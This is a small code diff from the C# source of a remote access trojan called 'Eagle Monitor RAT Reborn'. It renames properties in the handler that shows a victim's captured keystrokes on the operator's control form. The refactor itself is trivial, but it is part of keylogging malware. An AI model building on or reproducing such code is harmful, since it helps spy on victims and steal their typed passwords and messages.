@@ -15,9 +15,9 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
         {
             try
             {
-                ClientHandler.ClientHandlersList[keylogPacket.baseIp].clientForm.keystrokeRichTextBox.BeginInvoke((MethodInvoker)(() =>
+                ClientHandler.ClientHandlersList[keylogPacket.BaseIp].ClientForm.keystrokeRichTextBox.BeginInvoke((MethodInvoker)(() =>
                 {
-                    ClientHandler.ClientHandlersList[keylogPacket.baseIp].clientForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);
+                    ClientHandler.ClientHandlersList[keylogPacket.BaseIp].ClientForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);
                 }));
             }
             catch { }
